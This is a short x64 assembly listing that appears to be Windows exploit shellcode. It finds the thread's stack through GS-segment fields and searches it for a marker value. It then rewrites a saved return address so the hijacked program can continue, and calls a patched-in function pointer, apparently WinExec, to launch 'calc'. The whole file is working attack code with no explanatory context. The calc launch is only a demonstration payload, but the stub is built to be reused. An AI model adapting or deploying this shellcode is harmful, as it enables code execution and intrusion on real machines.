bits 64

find_stack:
  mov rdi, [gs:08h]
  mov rsi, [gs:10h]
  mov r8, 40404040000h

find_stack_loop:
  sub rdi, 08h
  cmp rdi, rsi
  jle find_stack_failed

  cmp r8, [rdi]
  jne find_stack_loop

  sub rdi, 30h
  mov rsp, rdi
  mov rdi, [rsp]
  add rdi, 47h
  mov [rsp], rdi

winexec:
  lea rcx, [rel cmdline]
  push 63636363h
  sub  rsp, 20h
  mov  rdi, 2323232323232323h
  call rdi

  add  rsp, 28h
  ret

find_stack_failed:
  int3
  
cmdline:
  db "calc", 0